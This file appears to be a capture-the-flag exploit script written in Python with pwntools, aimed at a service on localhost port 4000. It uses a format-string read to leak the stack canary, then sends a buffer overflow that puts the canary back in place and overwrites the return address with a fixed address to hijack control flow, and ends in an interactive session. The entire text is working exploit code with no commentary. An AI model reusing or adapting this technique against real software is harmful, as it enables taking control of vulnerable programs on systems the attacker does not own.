from pwn import *

r = remote('127.0.0.1',4000)

raw_input('#')

r.sendline('%15$p')
canary = int(r.recv(),16)
print hex(canary)

r.sendline('A'*40+p32(canary)+'B'*12+p32(0x0804854d))

r.interactive()
